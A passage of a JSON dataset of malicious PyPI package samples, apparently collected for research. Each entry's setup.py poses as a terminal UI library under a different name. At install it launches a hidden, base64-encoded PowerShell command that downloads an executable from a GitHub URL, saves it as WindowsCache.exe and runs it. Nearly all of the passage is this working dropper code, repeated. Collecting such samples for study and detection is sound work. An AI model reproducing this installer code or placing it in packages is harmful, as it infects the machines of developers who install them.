        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tptoolpywgui',\n    packages = ['modlib'],\n    version = '1.16',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-postvirtualreplace-v5.92",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-postvirtualreplace',\n    packages = ['modlib'],\n    version = '9.16',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-pushpingload-v3.47",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pushpingload',\n    packages = ['modlib'],\n    version = '5.83',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-esqgameloadrandom-v4.81",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqgameloadrandom',\n    packages = ['modlib'],\n    version = '7.73',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-esqlibkillstr-v10.27",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqlibkillstr',\n    packages = ['modlib'],\n    version = '5.44',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-esqproofpongint-v4.27",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqproofpongint',\n    packages = ['modlib'],\n    version = '9.77',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-esqsplitpushpush-v7.71",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqsplitpushpush',\n    packages = ['modlib'],\n    version = '4.56',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-libcontrolverlgtb-v5.50",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcontrolverLGTB',\n    packages = ['modlib'],\n    version = '1.17',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-libpipinfoad-v10.35",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpipinfoad',\n    packages = ['modlib'],\n    version = '2.18',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-libpywstrvm-v7.15",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpywstrvm',\n    packages = ['modlib'],\n    version = '9.46',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-libvirtualsplitstring-v2.35",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libvirtualsplitstring',\n    packages = ['modlib'],\n    version = '4.18',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-py-infohydrarandom-v1.57",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-infohydrarandom',\n    packages = ['modlib'],\n    version = '10.55',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-selfccvirtualgame-v6.70",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfccvirtualgame',\n    packages = ['modlib'],\n    version = '8.24',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-selfhydrastudycc-v2.15",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfhydrastudycc',\n    packages = ['modlib'],\n    version = '6.90',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-selfinturlstudy-v2.23",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfinturlstudy',\n    packages = ['modlib'],\n    version = '10.45',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-selflibmineload-v5.34",
